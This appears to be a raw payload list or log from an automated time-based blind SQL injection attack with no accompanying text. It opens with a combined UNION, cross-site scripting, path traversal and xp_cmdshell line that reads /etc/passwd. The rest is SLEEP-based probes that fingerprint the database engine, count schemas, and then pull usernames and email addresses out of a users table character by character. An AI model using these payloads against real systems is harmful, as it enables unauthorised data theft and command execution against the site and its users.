    1&Trzb=3367 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
    1.)("((',.)
    1'PiMRmD<'">ajxHBH
    1) AND (SELECT 3520 FROM (SELECT(SLEEP(5)))aOQg) AND (9412=9412
    1 AND (SELECT 3520 FROM (SELECT(SLEEP(5)))aOQg)
    1 AND (SELECT 3520 FROM (SELECT(SLEEP(0)))aOQg)
    1 AND (SELECT 3520 FROM (SELECT(SLEEP(5)))aOQg)
    1 AND (SELECT 1695 FROM (SELECT(SLEEP(5-(IF(24=24,0,5)))))rjsE)
    1 AND (SELECT 6278 FROM (SELECT(SLEEP(5-(IF(24=33,0,5)))))pvEe)
    1 AND (SELECT 9896 FROM (SELECT(SLEEP(5-(IF(24=35,0,5)))))lZEL)
    1 AND (SELECT 5199 FROM (SELECT(SLEEP(5-(IF(35=33,0,5)))))NOgr)
    1 AND (SELECT 9251 FROM (SELECT(SLEEP(5-(IF(33=33,0,5)))))fXRc)
    1 AND (SELECT 3281 FROM (SELECT(SLEEP(5-(IF(35 33,0,5)))))PZSt)
    1 AND (SELECT 2185 FROM (SELECT(SLEEP(5-(IF(7455=7455,0,5)))))FSgS) 
    1 AND (SELECT 7632 FROM (SELECT(SLEEP(5-(IF(8343>8342,0,5)))))OcDU)
    1 AND (SELECT 6943 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x254d61726961444225,0,5)))))XSkE)
    1 AND (SELECT 1424 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x255469444225,0,5)))))Pnaw)
    1 AND (SELECT 4468 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x256472697a7a6c6525,0,5)))))DYKa)
    1 AND (SELECT 1540 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x25506572636f6e6125,0,5)))))cXJn)
    1 AND (SELECT 5028 FROM (SELECT(SLEEP(5-(IF(AURORA_VERSION() LIKE 0x25,0,5)))))xmVW)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>51,0,5)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>48,0,5)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>49,0,5)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))>50,0,5)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))!=51,0,2)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>51,0,2)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>48,0,2)))))nONV)
    1 AND (SELECT 6414 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))>9,0,2)))))nONV)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),7,1))>110,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),7,1))>111,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),7,1))!=111,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),8,1))>96,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),8,1))>112,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),8,1))>104,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),8,1))>100,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),8,1))>98,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),8,1))>99,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),8,1))!=99,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),9,1))>96,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),9,1))>48,0,2)))))eMPL)
  1 AND (SELECT 8926 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 2,1),9,1))>1,0,2)))))eMPL)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>64,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>108,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>106,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))>105,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),1,1))!=106,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>108,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>110,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))>111,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),2,1))!=111,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>120,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>116,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>114,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))>113,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),3,1))!=114,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>108,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>110,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))>111,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),4,1))!=111,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>120,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>116,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>114,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))>115,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),5,1))!=115,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>100,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>102,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))>101,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),6,1))!=101,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),7,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),7,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),7,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),7,1))>108,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),7,1))>110,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),7,1))>109,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),7,1))!=110,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),8,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),8,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),8,1))>120,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),8,1))>116,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),8,1))>114,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),8,1))>115,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),8,1))!=115,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),9,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),9,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),9,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),9,1))>100,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),9,1))>102,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),9,1))>101,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),9,1))!=101,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),10,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),10,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),10,1))>104,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),10,1))>108,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),10,1))>106,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),10,1))>105,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),10,1))!=105,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),11,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),11,1))>48,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),11,1))>72,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),11,1))>60,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),11,1))>66,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),11,1))>63,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),11,1))>64,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),11,1))!=64,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),12,1))>64,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),12,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),12,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),12,1))>120,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),12,1))>116,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),12,1))>118,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),12,1))>117,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),12,1))!=117,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),13,1))>96,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),13,1))>112,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),13,1))>120,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),13,1))>116,0,2)))))eRMo)
  1 AND (SELECT 1900 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(email AS NCHAR),0x20) FROM myDB.users ORDER BY id LIMIT 3,1),13,1))>118,0,2)))))eRMo)
